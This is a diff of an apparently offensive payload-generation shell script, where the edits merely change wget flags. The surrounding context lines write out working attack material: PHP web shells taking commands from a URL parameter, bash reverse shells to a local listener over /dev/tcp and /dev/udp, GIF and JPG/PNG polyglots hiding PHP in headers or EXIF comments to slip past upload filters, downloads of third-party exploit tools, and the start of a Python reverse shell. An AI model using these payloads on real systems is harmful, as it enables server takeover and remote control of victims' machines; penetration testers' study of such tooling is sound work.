@@ -30,7 +30,7 @@ echo '<?php system($_GET["cmd"]); ?>' > system.php
 echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell_exec.php
 echo '<?php passthru($_GET["cmd"]); ?>' > passthru.php
 
-wget -Nq https://raw.githubusercontent.com/weaknetlabs/wpes/master/wpes.php
+wget -N https://raw.githubusercontent.com/weaknetlabs/wpes/master/wpes.php
 
 echo "<?php echo shell_exec(\"bash -i >& /dev/tcp/$ip_local/$port_local 0>&1 2>&1\"); ?>" > shell_reverse_tcp.min.php
 echo "<?php echo shell_exec(\"bash -i >& /dev/udp/$ip_local/$port_local 0>&1 2>&1\"); ?>" > shell_reverse_udp.min.php
@@ -40,7 +40,7 @@ echo "GIF89;" > system.gif; cat system.php >> system.gif
 echo "GIF89;" > passthru.gif; cat passthru.php >> passthru.gif
 
 # https://github.com/aureooms/pixels
-wget -Nq https://github.com/aureooms/pixels/raw/master/1x1%23000000.jpg
+wget -N https://github.com/aureooms/pixels/raw/master/1x1%23000000.jpg
 cp 1x1%23000000.jpg shell_exec.jpg
 exiftool -Comment="`cat shell_exec.php`" shell_exec.jpg
 cp 1x1%23000000.jpg system.jpg
@@ -49,7 +49,7 @@ cp 1x1%23000000.jpg passthru.jpg
 exiftool -Comment="`cat passthru.php`" passthru.jpg
 rm 1x1%23000000.jpg
 
-wget -Nq https://github.com/aureooms/pixels/raw/master/1x1%23000000.png
+wget -N https://github.com/aureooms/pixels/raw/master/1x1%23000000.png
 cp 1x1%23000000.png shell_exec.png
 exiftool -Comment="`cat shell_exec.php`" shell_exec.png
 cp 1x1%23000000.png system.png
@@ -90,7 +90,7 @@ fi
 
 echo "run post/windows/manage/migrate" > automigrate.rc
 
-wget -nQ https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py
+wget -N https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py
 
 cat <<\EOT >revserse_shell.py
 import socket,subprocess,os
